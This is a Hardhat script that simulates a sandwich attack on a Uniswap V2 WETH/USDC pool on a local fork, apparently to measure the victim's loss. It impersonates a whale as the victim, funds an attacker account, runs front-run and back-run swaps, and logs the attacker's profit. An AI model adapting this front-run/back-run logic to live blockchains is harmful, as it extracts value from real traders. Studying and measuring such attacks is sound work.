const hre = require("hardhat");
const {
    WETH_ADDRESS, USDC_ADDRESS, ROUTER_ADDRESS,
    IMPERSONATED_ACCOUNT, FORK_BLOCK, WETH_DECIMALS, USDC_DECIMALS
} = require("../src/constants.js");
const { setupProviderAndSigner } = require("../src/providerSetup.js");
const { getTokens, getRouter, getQuote, executeSwap } = require("../src/dexInteraction.js");
const { formatOutput, saveResult } = require("../src/resultLogger.js");

async function main() {
    console.log("Sandwich Attack Simulation...");
    try {
        // Reset fork to clean state to prevent accumulated base fee errors
        await hre.network.provider.send("hardhat_reset", [{
            forking: {
                jsonRpcUrl: hre.config.networks.hardhat.forking.url,
                blockNumber: FORK_BLOCK
            }
        }]);

        // 1. Setup victim (the impersonated whale) and the attacker
        const victimSigner = await setupProviderAndSigner(IMPERSONATED_ACCOUNT);
        console.log(`Victim account: ${victimSigner.address}`);

        // We use the first default Hardhat account as the attacker
        const signers = await hre.ethers.getSigners();
        const attackerSigner = signers[0];
        console.log(`Attacker account: ${attackerSigner.address}`);

        // Provide attacker with enough WETH to perform the attack
        const { weth: victimWeth, usdc: victimUsdc } = await getTokens(WETH_ADDRESS, USDC_ADDRESS, victimSigner);
        const { weth: attackerWeth, usdc: attackerUsdc } = await getTokens(WETH_ADDRESS, USDC_ADDRESS, attackerSigner);

        const victimRouter = await getRouter(ROUTER_ADDRESS, victimSigner);
        const attackerRouter = await getRouter(ROUTER_ADDRESS, attackerSigner);

        // Define swap amounts
        const victimAmountInEth = "14";
        const victimAmountIn = hre.ethers.parseUnits(victimAmountInEth, WETH_DECIMALS);

        // Attacker uses slightly more capital to significantly shift the pool
        const attackerAmountInEth = "60.0";
        const attackerAmountIn = hre.ethers.parseUnits(attackerAmountInEth, WETH_DECIMALS);

        // Cheat to give attacker WETH
        // The basic WETH ERC20 ABI doesn't have transfer, so we will use hardhat_setBalance 
        // to give the attacker raw ETH, and then wrap it into WETH directly via the WETH contract.
        await hre.network.provider.send("hardhat_setBalance", [
            attackerSigner.address,
            "0x56BC75E2D63100000" // 100 ETH
        ]);

        // Wrap 70.0 ETH into WETH
        const WETH_ABI_WRAP = ["function deposit() public payable"];
        const attackerWethContract = new hre.ethers.Contract(WETH_ADDRESS, WETH_ABI_WRAP, attackerSigner);
        await attackerWethContract.deposit({
            value: attackerAmountIn,
            gasLimit: 100000,
            maxFeePerGas: hre.ethers.parseUnits("300", "gwei"),
            maxPriorityFeePerGas: hre.ethers.parseUnits("2", "gwei")
        });
        console.log(`Funded Attacker with ${attackerAmountInEth} WETH via deposit`);

        const path = [WETH_ADDRESS, USDC_ADDRESS];
        const reversePath = [USDC_ADDRESS, WETH_ADDRESS];

        // 2. Record the baseline quote before manipulation
        const baselineQuoteWei = await getQuote(victimRouter, victimAmountIn, path);
        const baselineExpectedOutput = hre.ethers.formatUnits(baselineQuoteWei, USDC_DECIMALS);
        console.log(`Baseline expected output for victim: ${baselineExpectedOutput} USDC`);

        const victimUsdcBefore = await victimUsdc.balanceOf(victimSigner.address);
        const attackerWethBefore = await attackerWeth.balanceOf(attackerSigner.address);

        const slippageTolerance = 1; // Victim uses 1% slippage (matching baseline)
        const attackerSlippage = 15;  // Attacker allows more to guarantee their own moves

        // 3. ATTACT STEP 1: Attacker Front-run 
        // Attacker buys USDC with WETH, raising the price of USDC
        console.log("\n[1/3] Executing Attacker Front-run (WETH -> USDC)...");
        const attackerQuoteWei = await getQuote(attackerRouter, attackerAmountIn, path);
        const frontrunTx = await executeSwap(
            attackerRouter, attackerWeth, attackerAmountIn, attackerQuoteWei, path, attackerSigner, attackerSlippage
        );
        console.log(`Front-run Hash: ${frontrunTx.hash}`);

        // 4. ATTACK STEP 2: Victim Swap
        // Victim buys USDC with WETH (at the inflated price)
        console.log("\n[2/3] Executing Victim Swap...");
        // Re-get quote to simulate victim building transaction based on PREVIOUS state
        // In mempool they quoted baselineQuoteWei, so they pass that to swap
        const victimTx = await executeSwap(
            victimRouter, victimWeth, victimAmountIn, baselineQuoteWei, path, victimSigner, slippageTolerance
        );
        console.log(`Victim Hash: ${victimTx.hash}`);

        // 5. ATTACK STEP 3: Attacker Back-run
        // Attacker sells all acquired USDC back to WETH at the new higher WETH price
        console.log("\n[3/3] Executing Attacker Back-run (USDC -> WETH)...");
        const attackerUsdcBalance = await attackerUsdc.balanceOf(attackerSigner.address);
        const backrunQuoteWei = await getQuote(attackerRouter, attackerUsdcBalance, reversePath);
        const backrunTx = await executeSwap(
            attackerRouter, attackerUsdc, attackerUsdcBalance, backrunQuoteWei, reversePath, attackerSigner, attackerSlippage
        );
        console.log(`Back-run Hash: ${backrunTx.hash}`);

        // 6. Record Outputs and Metrics
        const victimUsdcAfter = await victimUsdc.balanceOf(victimSigner.address);
        const victimActualOutputWei = victimUsdcAfter - victimUsdcBefore;
        const attackedActualOutput = hre.ethers.formatUnits(victimActualOutputWei, USDC_DECIMALS);
        const attackerWethAfter = await attackerWeth.balanceOf(attackerSigner.address);

        console.log(`\nVictim actual output: ${attackedActualOutput} USDC`);

        // 7 & 8. Calculate Loss
        const baselineOutputNum = Number(baselineExpectedOutput);
        const actualOutputNum = Number(attackedActualOutput);
        const outputLossNum = baselineOutputNum - actualOutputNum;
        const lossPercentage = (outputLossNum / baselineOutputNum) * 100;

        console.log(`Victim Output Loss: ${outputLossNum.toFixed(6)} USDC (${lossPercentage.toFixed(2)}%)`);

        // 9. Attacker Profit (Gross, not accounting for gas for simplicity, but WETH delta is clear)
        const attackerWethDeltaWei = attackerWethAfter - attackerWethBefore;
        const attackerWethDelta = hre.ethers.formatUnits(attackerWethDeltaWei, WETH_DECIMALS);
        console.log(`Attacker WETH Profit: ${attackerWethDelta} WETH`);

        // Validation Checks
        if (victimActualOutputWei <= 0n) throw new Error("Validation Failed: Actual output is 0.");
        if (actualOutputNum >= baselineOutputNum) {
            throw new Error(`Validation Failed: Sandwich attack failed! Victim obtained ${actualOutputNum} >= ${baselineOutputNum} baseline. Adjust attacker capital.`);
        }

        const totalAttackerGas = frontrunTx.gasUsed + backrunTx.gasUsed;

        // 10. Save Output
        const resultData = formatOutput({
            scenario_name: " Sandwich Attack",
            fork_block: FORK_BLOCK,
            dex: "Uniswap V2",
            input_token: "WETH",
            output_token: "USDC",
            victim_input_amount: victimAmountInEth,
            slippage_tolerance: `${slippageTolerance}%`,
            baseline_expected_output: baselineExpectedOutput,
            attacked_actual_output: attackedActualOutput,
            victim_output_loss: outputLossNum.toFixed(6),
            financial_loss_percentage: `${lossPercentage.toFixed(2)}%`,
            attacker_gas_used: totalAttackerGas.toString(),
            victim_gas_used: victimTx.gasUsed.toString(),
            frontrun_hash: frontrunTx.hash,
            victim_hash: victimTx.hash,
            backrun_hash: backrunTx.hash,
            execution_status: "success"
        });

        saveResult(resultData, "sandwich_attack_result.json");
        console.log(JSON.stringify(resultData, null, 2));

    } catch (error) {
        console.error("Execution Error:", error.message);

        const fs = require('fs');
        const path = require('path');
        const resultsDir = path.join(__dirname, '..', 'results');
        if (!fs.existsSync(resultsDir)) fs.mkdirSync(resultsDir, { recursive: true });
        fs.writeFileSync(path.join(resultsDir, 'sandwich_attack_error.json'), JSON.stringify({ error: error.message }, null, 2));

        process.exit(1);
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
